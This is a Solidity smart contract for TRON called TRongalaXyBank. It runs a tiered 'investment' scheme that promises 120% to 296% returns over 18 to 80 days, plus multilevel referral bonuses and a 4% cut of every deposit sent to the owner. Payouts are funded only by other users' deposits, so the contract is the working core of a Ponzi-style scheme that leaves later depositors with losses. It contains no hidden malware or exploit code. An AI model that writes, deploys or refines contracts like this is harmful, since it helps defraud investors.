//SourceUnit: TRonGalaXyBank.sol

pragma solidity 0.5.10;

contract TRongalaXyBank {
    struct Tarif {
        uint8 life_days;
        uint16 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
       tarifs.push(Tarif(18, 120)); //
tarifs.push(Tarif(19, 123));
tarifs.push(Tarif(20, 126));
tarifs.push(Tarif(21, 129));
tarifs.push(Tarif(22, 132));
tarifs.push(Tarif(23, 135));
tarifs.push(Tarif(24, 138));
            	tarifs.push(Tarif(25, 142)); //
tarifs.push(Tarif(26, 145));
tarifs.push(Tarif(27, 148));
tarifs.push(Tarif(28, 152));
tarifs.push(Tarif(29, 155));
tarifs.push(Tarif(30, 158));
tarifs.push(Tarif(31, 162));
tarifs.push(Tarif(32, 165));
tarifs.push(Tarif(33, 168));
tarifs.push(Tarif(34, 172));
tarifs.push(Tarif(35, 175));
tarifs.push(Tarif(36, 178));
tarifs.push(Tarif(37, 182));
tarifs.push(Tarif(38, 185));
tarifs.push(Tarif(39, 188));
tarifs.push(Tarif(40, 192));
tarifs.push(Tarif(41, 195));
tarifs.push(Tarif(42, 198));
tarifs.push(Tarif(43, 202));
tarifs.push(Tarif(44, 206));
            	tarifs.push(Tarif(45, 211)); //
tarifs.push(Tarif(46, 213));
tarifs.push(Tarif(47, 216));
tarifs.push(Tarif(48, 218));
tarifs.push(Tarif(49, 221));
tarifs.push(Tarif(50, 223));
tarifs.push(Tarif(51, 226));
tarifs.push(Tarif(52, 228));
tarifs.push(Tarif(53, 231));
tarifs.push(Tarif(54, 233));
tarifs.push(Tarif(55, 236));
tarifs.push(Tarif(56, 238));
tarifs.push(Tarif(57, 241));
tarifs.push(Tarif(58, 243));
tarifs.push(Tarif(59, 246));
tarifs.push(Tarif(60, 248));
tarifs.push(Tarif(61, 251));
tarifs.push(Tarif(62, 253));
tarifs.push(Tarif(63, 256));
tarifs.push(Tarif(64, 258));
tarifs.push(Tarif(65, 261));
tarifs.push(Tarif(66, 263));
tarifs.push(Tarif(67, 266));
tarifs.push(Tarif(68, 268));
tarifs.push(Tarif(69, 271));
tarifs.push(Tarif(70, 273));
tarifs.push(Tarif(71, 276));
tarifs.push(Tarif(72, 278));
tarifs.push(Tarif(73, 281));
tarifs.push(Tarif(74, 283));
tarifs.push(Tarif(75, 285));
tarifs.push(Tarif(76, 287));
tarifs.push(Tarif(77, 289));
tarifs.push(Tarif(78, 291));
tarifs.push(Tarif(79, 293));
            	tarifs.push(Tarif(80, 296)); //

        ref_bonuses.push(5);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner)
{
            if(players[_upline].deposits.length == 0){
                _upline = owner;
            }
            else {
                players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 0 / 100);
            }
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 1e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 200, "Max 200 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value / 25);
        player.direct_bonus += (msg.value * 3 / 100); //
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }
    
    function getInvestmentsPlayer(uint index) view external returns (uint8 tarif, uint256 amount, uint40 time) {
        Player storage player = players[msg.sender];
        
        require(player.total_invested != 0, "No investments found");

        return (
            player.deposits[index].tarif,
            player.deposits[index].amount,
            player.deposits[index].time
        );
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}